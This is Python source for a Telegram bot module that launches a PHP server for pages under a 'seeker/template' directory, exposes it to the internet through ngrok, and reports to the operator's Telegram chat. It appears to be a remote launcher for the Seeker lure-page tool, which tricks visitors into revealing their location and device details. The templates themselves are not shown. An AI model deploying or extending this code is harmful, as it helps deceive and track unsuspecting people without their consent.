import requests
import subprocess
import threading
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from test import get_ngrok_http_address  # Import the seeker_data_parser function


def run_ngrok(chat_id, bot):
    try:
        ngrok_process = subprocess.Popen(["ngrok", "http", "4001"])
        time.sleep(1)
        get_ngrok_http_address(chat_id, bot)
        ngrok_process.wait()  # Wait for Ngrok to start and expose the tunnel


    except Exception as e:
        print(f"An error occurred: {str(e)}")


def stop_ngrok():
    try:
        # Find and terminate the ngrok process
        subprocess.run(["pkill", "ngrok"], check=True)
        print("Ngrok has been stopped.")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred with ngrok stopped: {str(e)}")


def seekServer(LOG_FILE, port, SITE, subp, sleep, cl_quit, bot, chat_id):
    print()
    preoc = False
    print(f'[+] Port : {port}\n')
    print(f'[+] Starting PHP Server...', end='', flush=True)
    cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'seeker/template/{SITE}/']

    with open(LOG_FILE, 'w+') as phplog:
        proc = subp.Popen(cmd, stdout=phplog, stderr=phplog)
        time.sleep(3)
        phplog.seek(0)
        run_ngrok_thread = threading.Thread(
            target=run_ngrok, args=(chat_id, bot))
        run_ngrok_thread.start()

        if 'Address already in use' in phplog.readline():
            preoc = True
        try:
            php_rqst = requests.get(f'http://127.0.0.1:{port}/index.html')
            php_sc = php_rqst.status_code

            if php_sc == 200:
                if preoc:
                    print(f'[ ✔ ]')
                    bot.send_message(chat_id, f'[✘] Server is already running!')
                    print()
                else:
                    bot.send_message(chat_id, "✅ Сервер запущен! ✅")
                    print(f'[ ✔ ]')
                    print()

            else:
                print(f'[ Status : {php_sc} ]')
                cl_quit(proc)
        except requests.ConnectionError:
            print(f'[ ✘ ]')
            cl_quit(proc)
    return proc
